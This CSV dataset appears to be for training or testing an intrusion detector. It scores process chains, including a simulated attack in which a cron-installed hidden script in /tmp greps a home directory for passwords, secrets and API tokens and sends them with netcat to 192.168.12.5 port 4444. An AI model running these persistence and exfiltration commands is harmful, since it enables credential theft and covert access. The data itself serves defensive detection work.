command_chain,count_read_event,count_write_event,count_sensitive_file_access_fails,count_socket_connect_event_successfully,count_socket_connect_event_fails,count_socket_create_event,count_file_modification_event_successfully,count_file_modification_event_fails,count_file_creation_event,count_link_event,count_symlink_event,count_dir_creation_event,count_dir_remove_event,count_mknod_create_event,count_rename_event,count_auth_event_successfully,count_auth_event_fails,count_passwd_change_event_successfully,count_passwd_change_event_fails,count_user_change_event_successfully,count_user_change_event_fails,count_do_not_update_atime,count_was_modified_time_changed,count_owner_changed,count_group_changed,count_suid_set,count_suid_cleared,count_sgid_set,count_sgid_cleared,count_sticky_set,count_sticky_cleared,count_user_write_added,count_user_write_removed,count_user_read_added,count_user_read_removed,count_user_exec_added,count_user_exec_removed,count_group_write_added,count_group_write_removed,count_group_exec_added,count_group_exec_removed,count_world_write_been_added,count_world_read_been_added,count_world_exec_been_added,count_external_ip,is_priviliged_port,count_sensitive_file,count_is_linked_to_sensitive_file,count_linked_file_SGID_or_SUID,count_atime_flag_been_set,count_modified_time_been_changed,is_current_dir_world_writable,is_target_dir_world_writable,is_in_memory_path,is_cross_user_link,is_dev_backdoor,is_fake_device,argv_has_network,argv_is_ip,argv_has_encoding,argv_is_net_tool,argv_is_sudo,argv_entropy,risk_score
./cron_miner.sh -> cat -> chmod +x /tmp/.system_maintenance.sh -> crontab -l -> crontab - -> cron_miner.sh,0,0,0,8,0,8,2,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.0290062658684764,4.055508496053542
cat,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1.9219280948873623,1.7852322209234566
chmod +x /tmp/.system_maintenance.sh,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.0290062658684764,1.8740309425778015
crontab -l,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.6756981353679867,3.232299288404838
crontab -,0,0,0,3,0,3,2,0,2,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.596791631981637,3.5694875071784002
crontab -l,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.6756981353679867,3.232299288404838
cron_miner.sh,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0
cron -> /bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,6,0,0,28,0,44,5,0,10,0,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0,0,3,4,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.2252216111284797,5.234699012889498
cron -> /bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,2,0,0,10,0,16,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,1,4,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.2252216111284797,4.458207403948888
/bin/sh -c /tmp/.system_maintenance.sh -> /tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,1,0,0,6,0,7,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,3,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.2252216111284797,3.9930979949873104
/tmp/.system_maintenance.sh -> grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account -> cat /tmp/.temp_scan -> nc -w 60 192.168.12.5 4444 -> rm /tmp/.temp_scan,0,0,0,3,0,3,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.2252216111284797,3.7187442970339495
grep -rE --exclude-dir=.cache --exclude-dir=.local --exclude-dir=.npm --exclude-dir=.mozilla password|secret|key|api_token /home/support_account,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3.2252216111284797,1.903987967045366
cat /tmp/.temp_scan,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.7223757082758455,1.850215129431317
nc -w 60 192.168.12.5 4444,0,0,0,3,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.7809521760351004,3.214485243879074
